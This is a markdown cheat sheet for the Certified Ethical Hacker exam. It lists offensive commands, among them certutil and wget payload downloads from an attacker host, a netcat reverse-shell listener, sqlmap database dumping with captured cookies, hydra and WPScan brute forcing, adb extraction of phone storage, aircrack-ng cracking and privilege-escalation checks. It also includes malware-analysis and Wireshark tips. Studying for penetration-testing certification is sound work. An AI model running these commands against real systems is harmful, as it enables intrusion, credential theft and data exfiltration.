# CEH Cheet Sheet


---

## 📂 1. File Sharing & Transfer (Windows ↔ Linux)
> **Common for both:** `python3 -m http.server 8080`

*   **Windows Download (Certutil):**  
    `Certutil.exe -Urlcache -f http://<ParrotIP>/eg.jpg C:\path\to\save\file\eg.jpg`
*   **Linux Download (wget):**  
    `wget http://<Windows_IP>:8080/eg.jpg -O eg.jpg`
*   **Netcat Listener (Reverse Shell):**  
    `nc -lnvp 1234` (Listens on port 1234 for incoming connections)

---

## 🔍 2. Enumeration & File Discovery
### Finding Files & Sorting
*   **Visual Tree:** `tree` (Works on Windows & Linux)
*   **Find all .txt:** `sudo find / -name *.txt`
*   **Search current path:** `sudo find . -name SpecificFileName.txt`
*   **Sort & Unique Passwords:**  
    `sort filename.txt | uniq > newfile.txt` (Removes duplicates from a wordlist)

### Infrastructure & Server ID
*   **Identify Servers:** `nmap -A -oN scans`
*   **Domain Controller (DC) Check:** Look for **88/TCP (kerberos-sec)** and **389/TCP (LDAP)**. 
*   **Vulnerability Research:** `nmap -Pn --script vuln <TIP> -T5`
*   **Directory Bruting:** `dirb <targetDomain> -x eg.txt`

---

## 📱 3. Mobile & IoT Security
*   **Connect:** `adb connect <TIP>:5555`
*   **Data Extraction:** `adb pull sdcard/`
*   **PhoneSploit:** `python3 phonesploitpro.py` (Interactive: **N**=Next, **P**=Previous)
*   **IoT Analysis:** Use `mqtt` filter in Wireshark for published messages.

---

## 🕸️ 4. Web & SQL Injection
### SQLmap Workflow
1.  **Auth Setup:** View Profile > `document.cookie` in console.
2.  **List DBs:** `sqlmap -u <url> --cookie "<value>" --dbs`
3.  **Dump Data:** `sqlmap -u <url> --cookie "<value>" -D dbName -T Users_Login --dump`

### WordPress (WPScan)
*   **Scan URL:** `wpscan -url <domain or ip>`
*   **Brute Force:** `wpscan -url <domain> -U user -P pass.txt -e u`

---

## ☣️ 5. Malware Analysis & Forensics
### Static & Binary Analysis
*   **file:** `file <filename>` (Identify file type/architecture)
*   **strings:** `strings <filename>` (Extract readable text/hardcoded passwords)
*   **binwalk:** `binwalk -e <filename>` (Search and extract hidden files/firmware)
*   **exiftool:** `exiftool <image_file>` (Read metadata like GPS, Author, Software)
*   **objdump:** `objdump -d <file>` (Disassemble executable sections)
*   **readpe:** `readpe --all <file.exe>` (Analyze PE headers)
*   **nm:** `nm -u <file>` (Undefined symbols/external calls)
*   **Entropy (Packed detection):** 
    *   **DIE (Detect It Easy)** for Windows.
    *   **ent <file>** for Linux (Calculates randomness/entropy).

### Hashing & Crypto
*   **Hash Multiple Files:** `HashMyFiles.exe` (Windows) or `sha256sum <file>` (Linux).
*   **Base64:** `echo "aGVsbG8=" | base64 --decode`
*   **Steganography:** `OpenStego`, `steghide` (Use `steghide extract -sf image.jpg`).

---

## 🦈 6. Wireshark & Traffic Analysis
*   **Filter SYN (No ACK):** `tcp.flags.syn == 1 && tcp.flags.ack == 0`
*   **Filter Content:** `frame contains "string"`
*   **Expert Info:** `Analyze` -> `Expert Info`
*   **DDoS Detection:** `Statistics` -> `Conversations` (Check for high volume no-reply).

---

## 🔑 7. Remote Access & Privilege Escalation
### SMB & Remote Login
*   **Check Shares:** `smbmap -H <TIP>` or `smbclient -L <TIP>`
*   **Brute Force:** `hydra -L users.txt -P pass.txt <TIP> smb -f`
*   **RDP Login:** `xfreerdp /v:<TIP> /u:username` or **Remmina**.

### Privilege Escalation (CEH Focus)
*   **Linux (Sudo):** `sudo -l` (List allowed commands). Check [GTFOBins](https://gtfobins.github.io/).
*   **Linux (SUID):** `find / -perm -u=s -type f 2>/dev/null` (Find files with root permissions).
*   **Windows (System Info):** `systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`
*   **Windows (Privs):** `whoami /priv` (Look for `SeImpersonatePrivilege`).
*   **Kernel Exploits:** Use `linux-exploit-suggester.sh` or `windows-exploit-suggester.py`.

---

## 🔓 8. Password & Hash Cracking
*   **.cap Files:** `aircrack-ng -w wordlist.txt capture.cap`
*   **BSSID Filter:** `aircrack-ng -b <bssid> -w wifiPassList.txt handShakeCapture.cap`
*   **Double-Encryption:** Decrypt with password first, then use hash crackers/online tools.

---
